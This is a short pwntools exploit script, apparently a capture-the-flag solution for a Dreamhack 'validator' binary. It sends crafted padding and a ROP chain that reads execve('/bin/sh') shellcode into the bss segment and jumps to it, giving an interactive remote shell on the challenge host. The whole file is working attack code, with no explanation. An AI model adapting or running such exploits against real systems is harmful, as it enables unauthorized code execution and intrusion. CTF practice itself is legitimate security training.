from pwn import *
r=process("./validator_dist")
#r=remote("host6.dreamhack.games",19173)
r=remote("host1.dreamhack.games",22385)

context.log_level='debug' 

context.arch = 'x86_64'
shell=asm(shellcraft.execve("/bin/sh",0,0))
pay = b"DREAMHACK!"

for i in range(118, 0, -1):
  pay += bytes([i])

pr = 0x00000000004006f3
prr = 0x00000000004006f1
prdx = 0x000000000040057b
bss = 0x60104B
read_plt = 0x400470

pay += p64(0)
pay += p64(pr)
pay += p64(0)
pay += p64(prr)
pay += p64(bss)
pay += p64(0)
pay += p64(prdx)
pay += p64(len(shell))
pay += p64(read_plt)
pay += p64(bss)

pause()
r.sendline(pay)
r.sendline(shell)
r.interactive()
